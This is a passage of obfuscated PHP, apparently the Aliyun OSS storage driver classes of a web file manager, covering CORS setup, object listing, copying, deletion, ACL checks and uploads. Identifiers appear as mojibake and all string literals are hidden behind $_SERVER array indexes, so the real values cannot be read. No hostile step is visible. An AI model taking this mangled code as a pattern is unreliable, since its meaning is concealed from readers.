$ø“ÖÒşô); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($‰÷Û§ª) { parent::__construct($‰÷Û§ª); $this->setSignVersion($_SERVER[ˆö¿ÚÌ¼][250]); } public function fileOutLink($½ÁÇé†õ) { $ŞãÛØ” =& $_SERVER[ˆö¿ÚÌ¼]; if (substr($½ÁÇé†õ, 0, 7) == $ŞãÛØ”[219]) { $½ÁÇé†õ = $ŞãÛØ”[220] . substr($½ÁÇé†õ, 7); } header($ŞãÛØ”[175] . $½ÁÇé†õ); die; } public function uploadFormData($ú§÷Ë”¤, $˜Î‡ƒÔ– = 3600) { return $this->uploadFormDataV2($ú§÷Ë”¤, $˜Î‡ƒÔ–); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($˜×çÎò•) { parent::__construct(); include_once SDK_DIR . $_SERVER[ˆö¿ÚÌ¼][1477]; $this->_init($˜×çÎò•); } public function _init($Òúî»Ë) { $ş±ãõ ê =& $_SERVER[ˆö¿ÚÌ¼]; $this->config = $Òúî»Ë; foreach ($Òúî»Ë as $ŠŒ„İ™— => $”›‹ğçû) { if (isset($this->{$ŠŒ„İ™—})) { $this->{$ŠŒ„İ™—} = $”›‹ğçû; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ş±ãõ ê[1478] . LNG($ş±ãõ ê[1479])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ıìöÙÄ‚ =& $_SERVER[ˆö¿ÚÌ¼]; $ÙàÜèûš = new OSS\Model\CorsConfig(); $©„–Ïö± = new OSS\Model\CorsRule(); $©„–Ïö±->addAllowedOrigin($ıìöÙÄ‚[1480]); $©„–Ïö±->addAllowedMethod($ıìöÙÄ‚[1481]); $©„–Ïö±->addAllowedMethod($ıìöÙÄ‚[1482]); $©„–Ïö±->addAllowedMethod($ıìöÙÄ‚[1483]); $©„–Ïö±->addAllowedMethod($ıìöÙÄ‚[1484]); $©„–Ïö±->addAllowedMethod($ıìöÙÄ‚[165]); $©„–Ïö±->setMaxAgeSeconds(600); $©„–Ïö±->addExposeHeader($ıìöÙÄ‚[1485]); $©„–Ïö±->addAllowedHeader($ıìöÙÄ‚[1480]); $ÙàÜèûš->addRule($©„–Ïö±); try { $this->client->putBucketCors($this->bucket, $ÙàÜèûš); } catch (OSS\Core\OssException $ìÆ›‰¯Ø) { $this->writeLog(__FUNCTION__ . $ıìöÙÄ‚[215] . $ìÆ›‰¯Ø->getMessage()); return !1; } return !0; } public function getBucketCors() { $ÄŸ“©‚á =& $_SERVER[ˆö¿ÚÌ¼]; $©„ü³á˜ = null; try { $©„ü³á˜ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Š¹½š†ö) { $this->writeLog(__FUNCTION__ . $ÄŸ“©‚á[215] . $Š¹½š†ö->getMessage()); return null; } if (!$©„ü³á˜ || !($°š£ñšÀ = $©„ü³á˜->getRules())) { return null; } $ßÔŞÓÀ = $°š£ñšÀ[0]->getAllowedOrigins(); $Ú¾ó×ä“ = $°š£ñšÀ[0]->getAllowedMethods(); $İ“Á–È¬ = $°š£ñšÀ[0]->getMaxAgeSeconds(); $—ãÔÛçµ = $°š£ñšÀ[0]->getExposeHeaders(); $Êö¦ÚÏ = $°š£ñšÀ[0]->getAllowedHeaders(); return array($ÄŸ“©‚á[221] => isset($ßÔŞÓÀ[0]) ? $ßÔŞÓÀ[0] : $ÄŸ“©‚á[12], $ÄŸ“©‚á[225] => $Ú¾ó×ä“, $ÄŸ“©‚á[1486] => $İ“Á–È¬, $ÄŸ“©‚á[1487] => isset($—ãÔÛçµ[0]) ? $—ãÔÛçµ[0] : $ÄŸ“©‚á[12], $ÄŸ“©‚á[222] => isset($Êö¦ÚÏ[0]) ? $Êö¦ÚÏ[0] : $ÄŸ“©‚á[12]); } public function isBucketCors() { $íê®é‘± =& $_SERVER[ˆö¿ÚÌ¼]; $àÜ¦Ö¤ = $this->getBucketCors(); if (!$àÜ¦Ö¤ || !is_array($àÜ¦Ö¤)) { return !1; } if ($àÜ¦Ö¤[$íê®é‘±[221]] != $íê®é‘±[223] || $àÜ¦Ö¤[$íê®é‘±[222]] != $íê®é‘±[223]) { return !1; } $®¸è¬Ù = array_map($íê®é‘±[224], $àÜ¦Ö¤[$íê®é‘±[225]]); if (!is_array($®¸è¬Ù)) { $®¸è¬Ù = array(); } $Á­Ê—Ú¦ = array($íê®é‘±[226], $íê®é‘±[227], $íê®é‘±[228], $íê®é‘±[229], $íê®é‘±[230]); $”ûÚû³‰ = array_diff($Á­Ê—Ú¦, $®¸è¬Ù); return empty($”ûÚû³‰); } public function mkfile($şÖæà˜, $íïÊÊ = '', $øë¶Ç’› = REPEAT_RENAME) { $è®İğÍœ = $this->setContent($şÖæà˜, $íïÊÊ); if ($è®İğÍœ !== !1) { return $this->getPathOuter($şÖæà˜); } return !1; } public function mkdir($Î«Õí‘ª, $µÈãµİÌ = REPEAT_SKIP) { if ($µÈãµİÌ && $this->_isFolder($Î«Õí‘ª)) { return $this->getPathOuter($Î«Õí‘ª); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Î«Õí‘ª)); } catch (OSS\Core\OssException $ö—ıìÅÛ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][215] . $ö—ıìÅÛ->getMessage()); return !1; } return $this->getPathOuter($Î«Õí‘ª); } private function fileList($ïÎÏßèÑ, $‰›ì•‹‹ = '', $ÀĞÍÛ«Ú = 0) { $²šï÷±Â =& $_SERVER[ˆö¿ÚÌ¼]; $ïÎÏßèÑ = trim($ïÎÏßèÑ, $²šï÷±Â[8]); $æÑâÖ‰½ = empty($ïÎÏßèÑ) && $ïÎÏßèÑ !== $²šï÷±Â[231] ? $²šï÷±Â[12] : $ïÎÏßèÑ . $²šï÷±Â[8]; $½„Ç„™õ = $²šï÷±Â[12]; $¹Ê£¦š = 1000; $êßŞï› = $ØüÉÜÚÊ = array(); while (!0) { check_abort(); $×ûòĞõ  = array($²šï÷±Â[1488] => $‰›ì•‹‹, $²šï÷±Â[1489] => $æÑâÖ‰½, $²šï÷±Â[1490] => $¹Ê£¦š, $²šï÷±Â[1491] => $½„Ç„™õ); try { $‚úšè¢ä = $this->client->listObjects($this->bucket, $×ûòĞõ ); } catch (OSS\Core\OssException $‡çè³Ó¶) { $this->writeLog(__FUNCTION__ . $²šï÷±Â[215] . $‡çè³Ó¶->getMessage()); break; } $½„Ç„™õ = $‚úšè¢ä->getNextMarker(); $Ã¼áØæÔ = $‚úšè¢ä->getObjectList(); $·ïÄ“Ë­ = $‚úšè¢ä->getPrefixList(); foreach ($Ã¼áØæÔ as $¶öëè…ı) { if ($¶öëè…ı->getKey() == $æÑâÖ‰½) { continue; } $®†ğ¯å¥ = $¶öëè…ı->getKey(); $²™ÅÔÒ = $¶öëè…ı->getSize(); $¼Éºò×ú = $¶öëè…ı->getLastModified(); $Ü¥êŠèµ = trim($¶öëè…ı->getETag(), $²šï÷±Â[121]); $Òá»ŸÇ = $ÀĞÍÛ«Ú ? array($²šï÷±Â[32] => $®†ğ¯å¥, $²šï÷±Â[79] => $²™ÅÔÒ, $²šï÷±Â[207] => strtotime($¼Éºò×ú), $²šï÷±Â[1492] => $Ü¥êŠèµ) : $®†ğ¯å¥; $ÂŸ¡×¼ê = $²™ÅÔÒ == 0 && substr($®†ğ¯å¥, strlen($®†ğ¯å¥) - 1, 1) == $²šï÷±Â[8] ? !0 : !1; $«¾Ï¸˜ğ = array($²šï÷±Â[79] => $²™ÅÔÒ, $²šï÷±Â[1493] => $²™ÅÔÒ, $²šï÷±Â[88] => strtotime($¼Éºò×ú), $²šï÷±Â[1494] => $¼Éºò×ú, $²šï÷±Â[1492] => $Ü¥êŠèµ); $this->cacheMethodInfoSet($®†ğ¯å¥, $ÂŸ¡×¼ê, $«¾Ï¸˜ğ); if ($ÂŸ¡×¼ê) { $êßŞï›[] = $®†ğ¯å¥; continue; } $ØüÉÜÚÊ[] = $Òá»ŸÇ; } foreach ($·ïÄ“Ë­ as $äÊ¨áà) { $êßŞï›[] = $äÊ¨áà->getPrefix(); $this->cacheMethodInfoSet($äÊ¨áà->getPrefix(), !0); } if ($½„Ç„™õ === $²šï÷±Â[12]) { break; } } $this->cacheMethodInfoSet($ïÎÏßèÑ, !0); return array($²šï÷±Â[85] => $êßŞï›, $²šï÷±Â[86] => $ØüÉÜÚÊ); } public function listObject($Õ¼êßğÙ, $ÔíŸ– = '') { $Âİ×¼Éí =& $_SERVER[ˆö¿ÚÌ¼]; $Õ¼êßğÙ = trim($Õ¼êßğÙ, $Âİ×¼Éí[8]); $È©–ŞÑ = empty($Õ¼êßğÙ) && $Õ¼êßğÙ !== $Âİ×¼Éí[231] ? $Âİ×¼Éí[12] : $Õ¼êßğÙ . $Âİ×¼Éí[8]; $õõú±¡ = $Âİ×¼Éí[12]; $²ù’†áê = 1000; $–¬–‘ø¬ = $€Åìê–û = array(); while (!0) { check_abort(); $·®Ó“òÉ = array($Âİ×¼Éí[1488] => $ÔíŸ–, $Âİ×¼Éí[1489] => $È©–ŞÑ, $Âİ×¼Éí[1490] => $²ù’†áê, $Âİ×¼Éí[1491] => $õõú±¡); try { $œá¬ß‹ = $this->client->listObjects($this->bucket, $·®Ó“òÉ); } catch (OSS\Core\OssException $ì¹ÌùÃ‚) { $this->writeLog(__FUNCTION__ . $Âİ×¼Éí[215] . $ì¹ÌùÃ‚->getMessage()); break; } $õõú±¡ = $œá¬ß‹->getNextMarker(); $¤ÇŠÇª = $œá¬ß‹->getObjectList(); foreach ($¤ÇŠÇª as $Ø¼êíØ») { if ($Ø¼êíØ»->getKey() == $È©–ŞÑ) { continue; } $´Ù¿ã = $Ø¼êíØ»->getKey(); $˜òìëşÎ = $Ø¼êíØ»->getSize(); $µ³Ü¿ÓÜ = $˜òìëşÎ == 0 && substr($´Ù¿ã, strlen($´Ù¿ã) - 1, 1) == $Âİ×¼Éí[8] ? !0 : !1; if ($µ³Ü¿ÓÜ) { continue; } $€Åìê–û[] = $˜òìëşÎ . $Âİ×¼Éí[215] . $´Ù¿ã; } if ($õõú±¡ === $Âİ×¼Éí[12]) { break; } } return array($Âİ×¼Éí[85] => $–¬–‘ø¬, $Âİ×¼Éí[86] => $€Åìê–û); } public function copyFile($ÌÄ˜óîû, $”Æ¿¬³) { $ó·‰¡à¥ = $this->size($ÌÄ˜óîû); if ($ó·‰¡à¥ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ÌÄ˜óîû, $this->bucket, $this->pathEncode($”Æ¿¬³)); } catch (OSS\Core\OssException $¦”ó­èõ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][215] . $¦”ó­èõ->getMessage()); return !1; } return $this->getPathOuter($”Æ¿¬³); } $‘Ö¥š–û = $this->multiCopyObject($ÌÄ˜óîû, $”Æ¿¬³, $ó·‰¡à¥); return $‘Ö¥š–û ? $this->getPathOuter($”Æ¿¬³) : !1; } private function multiCopyObject($ûä¡ñ‰, $½œï™¹, $†´Ë­Æº) { $üşÇÇçÔ =& $_SERVER[ˆö¿ÚÌ¼]; try { $°áßòç³ = array(); if ($ÂØö±µ“ = $this->hashMd5($ûä¡ñ‰)) { $°áßòç³ = array(OSS\OssClient::OSS_HEADERS => array($üşÇÇçÔ[1495] => $ÂØö±µ“)); } $Ô®òí² = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($½œï™¹), $°áßòç³); $‹ºÒ´àŠ = 1; $•ˆ¬Ëè = 0; $Ñ£Ö¯Êâ = array(); $ªú¥×·­ = 1024 * 1024 * 10; $é½³ùÄà = $this->client->generateMultiuploadParts($†´Ë­Æº, $ªú¥×·­); foreach ($é½³ùÄà as $ø¢ÇñÕ¤ => $ÊÓŠ¢±) { $º«Òô¶È = $•ˆ¬Ëè + (int) $ÊÓŠ¢±[$üşÇÇçÔ[1496]]; $ıƒ´š‚ª = (int) $ÊÓŠ¢±[$üşÇÇçÔ[415]] + $º«Òô¶È - 1; $Íø¦£¿© = array($üşÇÇçÔ[167] => $º«Òô¶È, $üşÇÇçÔ[168] => $ıƒ´š‚ª); $Ñ£Ö¯Êâ[] = $this->client->uploadPartCopy($this->bucket, $ûä¡ñ‰, $this->bucket, $this->pathEncode($½œï™¹), $‹ºÒ´àŠ, $Ô®òí², $Íø¦£¿©); $‹ºÒ´àŠ = $‹ºÒ´àŠ + 1; } $õ§ğ´è = array(); foreach ($Ñ£Ö¯Êâ as $ø¢ÇñÕ¤ => $Ç°ïØ·¨) { $õ§ğ´è[] = array($üşÇÇçÔ[300] => $ø¢ÇñÕ¤ + 1, $üşÇÇçÔ[301] => $Ç°ïØ·¨); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($½œï™¹), $Ô®òí², $õ§ğ´è); } catch (OSS\Core\OssException $ÖœĞ¨ÖÆ) { $this->writeLog(__FUNCTION__ . $üşÇÇçÔ[215] . $ÖœĞ¨ÖÆ->getMessage()); return !1; } return !0; } public function moveFile($ÇÅŒˆ¸, $õ­ı¾áä) { if ($this->copyFile($ÇÅŒˆ¸, $õ­ı¾áä)) { $this->remove($ÇÅŒˆ¸); return $this->getPathOuter($õ­ı¾áä); } return !1; } public function delFile($‡šŞ‡ñ™) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($‡šŞ‡ñ™)); } catch (OSS\Core\OssException $¾ÁïÖ„‚) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][215] . $¾ÁïÖ„‚->getMessage()); return !1; } return !0; } public function delFolder($š¹Ïîé…) { $éçğì¶â =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->exist($š¹Ïîé…)) { return !0; } $this->listItemCache = !1; $ÚÉŸ–Ó = $this->fileList($š¹Ïîé…); $this->listItemCache = !0; $Ì±ü£ÈÙ = trim($š¹Ïîé…, $éçğì¶â[8]) . $éçğì¶â[8]; if (!empty($š¹Ïîé…) && $š¹Ïîé… !== $éçğì¶â[231] && !in_array($Ì±ü£ÈÙ, $ÚÉŸ–Ó[$éçğì¶â[85]])) { $ÚÉŸ–Ó[$éçğì¶â[85]][] = $Ì±ü£ÈÙ; } $ûµğ×™ = $this->delByBatch($ÚÉŸ–Ó[$éçğì¶â[86]]); if (!$ûµğ×™) { return !1; } $ûµğ×™ = $this->delByBatch($ÚÉŸ–Ó[$éçğì¶â[85]]); if (!$ûµğ×™) { return !1; } return $this->delFile($Ì±ü£ÈÙ); } private function delByBatch($¶•Ãğ À) { foreach (array_chunk($¶•Ãğ À, 1000) as $§”–şá‚) { try { $this->client->deleteObjects($this->bucket, $§”–şá‚); } catch (OSS\Core\OssException $µ¶Ùª¯…) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][215] . $µ¶Ùª¯…->getMessage()); return !1; } } return !0; } public function rename($Á«®Ò¼, $Ã€Äğ‡™) { return $this->renameObject($Á«®Ò¼, $Ã€Äğ‡™); } private function fileInfo($ŒÛú›™Ò, $ÉŸ¤Ú€ä = false, $Ä«İƒØÌ = array()) { $ˆƒŸï¯ =& $_SERVER[ˆö¿ÚÌ¼]; $¯¢ïµœÌ = array($ˆƒŸï¯[32] => $this->pathThis($ŒÛú›™Ò), $ˆƒŸï¯[87] => $this->getPathOuter($ŒÛú›™Ò), $ˆƒŸï¯[33] => $ˆƒŸï¯[233], $ˆƒŸï¯[79] => isset($Ä«İƒØÌ[$ˆƒŸï¯[79]]) ? $Ä«İƒØÌ[$ˆƒŸï¯[79]] : 0, $ˆƒŸï¯[169] => $this->ext($ŒÛú›™Ò)); if ($ÉŸ¤Ú€ä) { return $¯¢ïµœÌ; } $¯¢ïµœÌ[$ˆƒŸï¯[234]] = $¯¢ïµœÌ[$ˆƒŸï¯[88]] = 0; $¯¢ïµœÌ[$ˆƒŸï¯[235]] = $¯¢ïµœÌ[$ˆƒŸï¯[236]] = !0; if (empty($Ä«İƒØÌ)) { $Ë±››¨ = $this->objectMeta($ŒÛú›™Ò); if (!$Ë±››¨) { return $¯¢ïµœÌ; } $Ä«İƒØÌ = array($ˆƒŸï¯[88] => strtotime($Ë±››¨[$ˆƒŸï¯[1494]]), $ˆƒŸï¯[79] => $Ë±››¨[$ˆƒŸï¯[1493]] + 0, $ˆƒŸï¯[1492] => $Ë±››¨[$ˆƒŸï¯[1492]]); } if (isset($Ä«İƒØÌ[$ˆƒŸï¯[1492]]) && $Ä«İƒØÌ[$ˆƒŸï¯[1492]]) { $¯¢ïµœÌ[$ˆƒŸï¯[238]] = trim($Ä«İƒØÌ[$ˆƒŸï¯[1492]], $ˆƒŸï¯[121]); } if (isset($Ä«İƒØÌ[$ˆƒŸï¯[79]])) { $¯¢ïµœÌ[$ˆƒŸï¯[79]] = $Ä«İƒØÌ[$ˆƒŸï¯[79]]; } if (isset($Ä«İƒØÌ[$ˆƒŸï¯[88]])) { $¯¢ïµœÌ[$ˆƒŸï¯[88]] = $Ä«İƒØÌ[$ˆƒŸï¯[88]]; } if (isset($Ä«İƒØÌ[$ˆƒŸï¯[207]]) && !trim($¯¢ïµœÌ[$ˆƒŸï¯[88]])) { $¯¢ïµœÌ[$ˆƒŸï¯[88]] = $Ä«İƒØÌ[$ˆƒŸï¯[207]]; } return $¯¢ïµœÌ; } private function folderInfo($ÛÏÅ²ŞÆ, $øß¤«ı = false, $ÑŠŒ”Ÿ = array()) { $±Ú˜“û =& $_SERVER[ˆö¿ÚÌ¼]; $ùÌÕ¶åÖ = array($±Ú˜“û[32] => $this->pathThis($ÛÏÅ²ŞÆ), $±Ú˜“û[87] => $this->getPathOuter($±Ú˜“û[8] . $ÛÏÅ²ŞÆ), $±Ú˜“û[33] => $±Ú˜“û[78]); if ($øß¤«ı) { return $ùÌÕ¶åÖ; } $ùÌÕ¶åÖ[$±Ú˜“û[234]] = $ùÌÕ¶åÖ[$±Ú˜“û[88]] = 0; $ùÌÕ¶åÖ[$±Ú˜“û[235]] = $ùÌÕ¶åÖ[$±Ú˜“û[236]] = !0; if (empty($ÑŠŒ”Ÿ)) { $ÛÏÅ²ŞÆ = rtrim($ÛÏÅ²ŞÆ, $±Ú˜“û[8]) . $±Ú˜“û[8]; $°›èˆ“Û = $this->objectMeta($ÛÏÅ²ŞÆ); if (!$°›èˆ“Û) { return $ùÌÕ¶åÖ; } $ÑŠŒ”Ÿ = array($±Ú˜“û[234] => $°›èˆ“Û[$±Ú˜“û[589]][$±Ú˜“û[1497]], $±Ú˜“û[88] => strtotime($°›èˆ“Û[$±Ú˜“û[1494]])); } if (isset($ÑŠŒ”Ÿ[$±Ú˜“û[88]])) { $ùÌÕ¶åÖ[$±Ú˜“û[88]] = $ÑŠŒ”Ÿ[$±Ú˜“û[88]]; } if (isset($ÑŠŒ”Ÿ[$±Ú˜“û[234]])) { $ùÌÕ¶åÖ[$±Ú˜“û[234]] = $ÑŠŒ”Ÿ[$±Ú˜“û[234]]; } return $ùÌÕ¶åÖ; } public function listPath($Ë†ÓÀŞ, $É°í‹ß… = false) { $ƒë›Çñ =& $_SERVER[ˆö¿ÚÌ¼]; $ú³²Ê«æ = $this->fileList($Ë†ÓÀŞ, $ƒë›Çñ[8], !0); foreach ($ú³²Ê«æ[$ƒë›Çñ[85]] as $ƒšú©£É => $ğ‰¨Ğ¼ê) { $ú³²Ê«æ[$ƒë›Çñ[85]][$ƒšú©£É] = $this->folderInfo($ğ‰¨Ğ¼ê, $É°í‹ß…, $ğ‰¨Ğ¼ê); } foreach ($ú³²Ê«æ[$ƒë›Çñ[86]] as $ƒšú©£É => $ğ‰¨Ğ¼ê) { $ú³²Ê«æ[$ƒë›Çñ[86]][$ƒšú©£É] = $this->fileInfo($ğ‰¨Ğ¼ê[$ƒë›Çñ[32]], $É°í‹ß…, $ğ‰¨Ğ¼ê); } return $ú³²Ê«æ; } protected function infoChildren($‘ÏøÖÑ, &$¦ñàµ’) { $ó‡îÉª =& $_SERVER[ˆö¿ÚÌ¼]; $÷úÆœÃû = $this->fileList($‘ÏøÖÑ, $ó‡îÉª[12], !0); $¦ñàµ’[$ó‡îÉª[81]] += count($÷úÆœÃû[$ó‡îÉª[85]]); $¦ñàµ’[$ó‡îÉª[80]] += count($÷úÆœÃû[$ó‡îÉª[86]]); foreach ($÷úÆœÃû[$ó‡îÉª[86]] as $Âœ¡è) { if (!$Âœ¡è || !$Âœ¡è[$ó‡îÉª[79]]) { continue; } $¦ñàµ’[$ó‡îÉª[79]] += $Âœ¡è[$ó‡îÉª[79]]; } } public function has($‡éÔ°Ÿ‘, $ó¤ˆÏŸè = false, $Ğâ—Çö = true) { $Šğæ’Ù =& $_SERVER[ˆö¿ÚÌ¼]; $‡éÔ°Ÿ‘ = trim($‡éÔ°Ÿ‘, $Šğæ’Ù[8]); $åßé²äå = empty($‡éÔ°Ÿ‘) && $‡éÔ°Ÿ‘ !== $Šğæ’Ù[231] ? $Šğæ’Ù[12] : $‡éÔ°Ÿ‘ . $Šğæ’Ù[8]; $ÅŠ¸¼Ü = $Šğæ’Ù[12]; $ª˜Éşâ‰ = 500; $úÓ£Éø¤ = $âìèµ³¢ = 0; while (!0) { check_abort(); $Øğøò‹ = array($Šğæ’Ù[1488] => $Šğæ’Ù[8], $Šğæ’Ù[1489] => $åßé²äå, $Šğæ’Ù[1490] => $ª˜Éşâ‰, $Šğæ’Ù[1491] => $ÅŠ¸¼Ü); try { $êÇ“™å = $this->client->listObjects($this->bucket, $Øğøò‹); } catch (OSS\Core\OssException $”ôë†´á) { $this->writeLog(__FUNCTION__ . $Šğæ’Ù[215] . $”ôë†´á->getMessage()); break; } $ÅŠ¸¼Ü = $êÇ“™å->getNextMarker(); $óïŠ”¸Œ = $êÇ“™å->getObjectList(); $Ä‰ùñïØ = $êÇ“™å->getPrefixList(); if ($ó¤ˆÏŸè) { if (count($óïŠ”¸Œ) > 1 || count($óïŠ”¸Œ) == 1 && $óïŠ”¸Œ[0]->getKey() != $åßé²äå) { $úÓ£Éø¤ += count($óïŠ”¸Œ) - 1; } if (!empty($Ä‰ùñïØ)) { $âìèµ³¢ += count($Ä‰ùñïØ); } if ($ÅŠ¸¼Ü === $Šğæ’Ù[12]) { break; } continue; } if ($Ğâ—Çö) { if (!empty($óïŠ”¸Œ)) { if (count($óïŠ”¸Œ) > 1 || $óïŠ”¸Œ[0]->getKey() != $åßé²äå) { return !0; } } } else { if (!empty($Ä‰ùñïØ)) { return !0; } } if ($ÅŠ¸¼Ü === $Šğæ’Ù[12]) { break; } } if ($ó¤ˆÏŸè) { return array($Šğæ’Ù[242] => $úÓ£Éø¤, $Šğæ’Ù[243] => $âìèµ³¢); } return !1; } public function listAll($ò€‡×şî) { $ƒ‰éÖÔÑ =& $_SERVER[ˆö¿ÚÌ¼]; $ÎŠãùä = $this->fileList($ò€‡×şî, $ƒ‰éÖÔÑ[12], !0); $Ö¶ŒğÌ³ = array_to_keyvalue($ÎŠãùä[$ƒ‰éÖÔÑ[86]], $ƒ‰éÖÔÑ[32]); foreach ($ÎŠãùä[$ƒ‰éÖÔÑ[85]] as $¼üÄÈ) { if (is_string($¼üÄÈ)) { $Ö¶ŒğÌ³[$¼üÄÈ] = array($ƒ‰éÖÔÑ[79] => 0); } } return $this->listAllFiles($ò€‡×şî, $Ö¶ŒğÌ³); } public function canRead($ûß‚¿Ô‚) { $óÑ³˜Øú =& $_SERVER[ˆö¿ÚÌ¼]; $¶Áüà = $this->pathAcl($ûß‚¿Ô‚); return $¶Áüà == $óÑ³˜Øú[1498] || $¶Áüà == $óÑ³˜Øú[636] ? !0 : !1; } public function canWrite($ÔÒş ›Ğ) { $†Ò–Éƒû = $this->pathAcl($ÔÒş ›Ğ); return $†Ò–Éƒû == $_SERVER[ˆö¿ÚÌ¼][636] ? !0 : !1; } public function pathAcl($©ùÎšôƒ) { $é‚«Ì¾Å =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Å§ÂÉ®­ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($©ùÎšôƒ)); } catch (OSS\Core\OssException $é¹–Ã”) { $this->writeLog(__FUNCTION__ . $é‚«Ì¾Å[215] . $é¹–Ã”->getMessage()); return !1; } $Í¨Ù¢ò™ = $Å§ÂÉ®­ == $é‚«Ì¾Å[37] ? $this->bucketAcl : $Å§ÂÉ®­; if ($Í¨Ù¢ò™ == $é‚«Ì¾Å[1499]) { return $é‚«Ì¾Å[1498]; } if ($Í¨Ù¢ò™ == $é‚«Ì¾Å[1500]) { return $é‚«Ì¾Å[636]; } return $Í¨Ù¢ò™; } private function chmodPath($‚Ñ¶Ú¿¿, $Å¾²÷ÆÎ = '') { $³ÔˆåÇ =& $_SERVER[ˆö¿ÚÌ¼]; $ÜŞ¶»³Ú = empty($Å¾²÷ÆÎ) ? $³ÔˆåÇ[1500] : $Å¾²÷ÆÎ; $éëÌ±• = array($³ÔˆåÇ[37], $³ÔˆåÇ[232], $³ÔˆåÇ[1499], $³ÔˆåÇ[1500]); if (!in_array($ÜŞ¶»³Ú, $éëÌ±•)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($‚Ñ¶Ú¿¿), $ÜŞ¶»³Ú); } catch (OSS\Core\OssException $˜ÄÇÅÌ¬) { $this->writeLog(__FUNCTION__ . $³ÔˆåÇ[215] . $˜ÄÇÅÌ¬->getMessage()); return !1; } return !0; } public function getContent($ »ù¿ñÚ) { return $this->fileSubstr($ »ù¿ñÚ, -1); } public function setContent($·ğŠ—¹, $äŒÃ§ê« = '') { $ßˆõœÛ¤ =& $_SERVER[ˆö¿ÚÌ¼]; try { $İÌ—øÙ = $this->trafficLimit($ßˆõœÛ¤[1501]); $áĞÎÌæù = $this->client->putObject($this->bucket, $this->pathEncode($·ğŠ—¹), $äŒÃ§ê«, $İÌ—øÙ); } catch (OSS\Core\OssException $ÕùÑìé») { $this->writeLog(__FUNCTION__ . $ßˆõœÛ¤[215] . $ÕùÑìé»->getMessage()); return !1; } $½ìıİŸ = array($ßˆõœÛ¤[1495] => trim($áĞÎÌæù[$ßˆõœÛ¤[1492]], $ßˆõœÛ¤[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($·ğŠ—¹))); $this->updateObjMeta($·ğŠ—¹, $½ìıİŸ); return isset($áĞÎÌæù[$ßˆõœÛ¤[1502]][$ßˆõœÛ¤[297]]) ? !0 : !1; } private function updateObjMeta($ÈÓÆÁÎ‚, $É¤Ì™Ç) { $ÈÓÆÁÎ‚ = $this->pathEncode($ÈÓÆÁÎ‚); try { $¸´ïâ× = array(OSS\OssClient::OSS_HEADERS => $É¤Ì™Ç); $this->client->copyObject($this->bucket, $ÈÓÆÁÎ‚, $this->bucket, $ÈÓÆÁÎ‚, $¸´ïâ×); } catch (OSS\Core\OssException $èäü„ñ±) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][215] . $èäü„ñ±->getMessage()); return !1; } return !0; } public function upload($ñÌú´Ÿ§, $Òİç éƒ, $âÀåš‰ = false, $ëØî±ÈÛ = REPEAT_REPLACE) { $æÁÇï˜© =& $_SERVER[ˆö¿ÚÌ¼]; $×“£ìïú = trim($ñÌú´Ÿ§, $æÁÇï˜©[8]); $ÜîŒäÕ÷ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($æÁÇï˜©[1495] => @md5_file($Òİç éƒ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ñÌú´Ÿ§))); $ÜîŒäÕ÷ = $this->trafficLimit($æÁÇï˜©[1501], $ÜîŒäÕ÷); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($×“£ìïú), $Òİç éƒ, $ÜîŒäÕ÷); } catch (OSS\Core\OssException $¯¸Ë¼) { $this->writeLog(__FUNCTION__ . $æÁÇï˜©[215] . $¯¸Ë¼->getMessage()); return !1; } return $this->getPathOuter($ñÌú´Ÿ§); } public function getHost() { $ğ£ÛØ ƒ =& $_SERVER[ˆö¿ÚÌ¼]; $¥èÆ‘²‘ = explode($ğ£ÛØ ƒ[211], parent::getHost()); return $¥èÆ‘²‘[0] . $ğ£ÛØ ƒ[211] . $this->bucket . $ğ£ÛØ ƒ[10] . $¥èÆ‘²‘[1]; } public function uploadFormData($»¿æÎÕİ, $ôùÌş¶ = 3600) { $äºÛñ¢ =& $_SERVER[ˆö¿ÚÌ¼]; if (!($áàáÂ› = $this->getHost())) { return !1; } $–˜ĞÙ×ª = $ôùÌş¶; $—ÆÙà–æ = date($äºÛñ¢[1503], time() + $–˜ĞÙ×ª); $³«ƒ±¹ = new DateTime($—ÆÙà–æ); $¤Šİ¬¡´ = $³«ƒ±¹->format(DateTime::ISO8601); $­×–¢°Ş = strpos($¤Šİ¬¡´, $äºÛñ¢[374]); $¤Šİ¬¡´ = substr($¤Šİ¬¡´, 0, $­×–¢°Ş) . $äºÛñ¢[1504]; $Ïùñß” = 1048576000 * 5; $õ±Š¥ = $this->pathFather($»¿æÎÕİ); $¡¹å€³ô = array($äºÛñ¢[265] => $¤Šİ¬¡´, $äºÛñ¢[268] => array(array($äºÛñ¢[1505], 0, $Ïùñß”), array($äºÛñ¢[270], $äºÛñ¢[271], $õ±Š¥))); $®´µÃ‰ = 